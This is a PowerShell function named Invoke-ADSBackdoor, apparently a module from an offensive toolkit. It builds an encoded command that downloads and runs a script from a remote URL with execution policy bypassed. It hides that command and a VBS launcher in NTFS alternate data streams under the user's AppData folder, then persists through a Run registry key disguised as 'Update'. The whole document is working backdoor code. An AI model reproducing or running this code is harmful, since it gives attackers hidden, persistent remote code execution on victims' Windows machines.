function Invoke-ADSBackdoor{

$TextfileName = [System.IO.Path]::GetRandomFileName() + ".txt"
$textFile = $TextfileName -split '\.',([regex]::matches($TextfileName,"\.").count) -join ''
$VBSfileName = [System.IO.Path]::GetRandomFileName() + ".vbs"
$vbsFile = $VBSFileName -split '\.',([regex]::matches($VBSFileName,"\.").count) -join ''

#Store Payload
$payloadParameters = "IEX ((New-Object Net.WebClient).DownloadString('R{URL}')); #R{ARGUMENTS}"
$encodedPayload = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payloadParameters))
$payload = "powershell.exe -ep Bypass -noexit -enc $encodedPayload"
#Store VBS Wrapper
$vbstext1 = "Dim objShell"
$vbstext2 = "Set objShell = WScript.CreateObject(""WScript.Shell"")"
$vbstext3 = "command = ""cmd /C for /f """"delims=,"""" %i in ($env:UserProfile\AppData:$textFile) do %i"""
$vbstext4 = "objShell.Run command, 0"
$vbstext5 = "Set objShell = Nothing"
$vbText = $vbstext1 + ":" + $vbstext2 + ":" + $vbstext3 + ":" + $vbstext4 + ":" + $vbstext5
#Create Alternate Data Streams for Payload and Wrapper
$CreatePayloadADS = {cmd /C "echo $payload > $env:USERPROFILE\AppData:$textFile"}
$CreateWrapperADS = {cmd /C "echo $vbtext > $env:USERPROFILE\AppData:$vbsFile"}
Invoke-Command -ScriptBlock $CreatePayloadADS
Invoke-Command -ScriptBlock $CreateWrapperADS
#Persist in Registry
new-itemproperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name Update -PropertyType String -Value "wscript.exe $env:USERPROFILE\AppData:$vbsFile" -Force
Write-Host "Process Complete. Persistent key is located at HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\Update"
}
